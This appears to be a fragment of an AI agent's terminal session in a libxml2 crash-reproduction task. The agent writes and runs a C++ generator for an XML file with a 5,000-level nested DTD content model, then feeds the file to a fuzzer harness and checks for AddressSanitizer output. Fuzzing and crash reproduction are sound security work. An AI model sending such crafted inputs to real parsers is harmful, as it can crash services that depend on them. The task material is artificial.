@@ -1,0 +1,45 @@
+Previous response had warnings:
+WARNINGS: - Extra text detected before JSON object
+- Extra text detected after JSON object
+
+New Terminal Output:
+
+cat /tmp/crash_output.txt | grep -A 5 -i asan
+cat << 'EOF' > /tmp/search3.cc
+#include <iostream>
+#include <string>
+#include <fstream>
+#include <limits>
+#include <functional>
+
+int main() {
+    int depth = 5000;
+    std::string s = "a";
+    for (int i = 0; i < depth; i++) {
+        s = "(a|" + s + ")";
+    }
+    std::string base_xml = "<!DOCTYPE root [\n<!ELEMENT root " + s + ">\n]>\n<root><b/></root>";
+
+    std::hash<std::string> hasher;
+    const int max_option_value = std::numeric_limits<int>::max();
+
+    for (int i = 0; i < 100000; i++) {
+        std::string test_str = base_xml + std::string(i, ' ');
+        std::size_t hash = hasher(test_str);
+        int opt = hash % max_option_value;
+
+        if ((opt & 16) && (opt & (1<<19)) && !(opt & 32) && !(opt & 256) && !(opt & 4096)) {
+            std::ofstream out("/tmp/test_huge3.xml");
+            out << test_str;
+            std::cout << "Found at padding " << i << " opt " << opt << std::endl;
+            return 0;
+        }
+    }
+    return 1;
+}
+EOF
+g++ -O3 -o /tmp/search3 /tmp/search3.cc
+/tmp/search3
+/out/libxml2_xml_read_memory_fuzzer /tmp/test_huge3.xml > /tmp/crash_output.txt 2>&1
+grep -A 5 -i asan /tmp/crash_output.txt
+
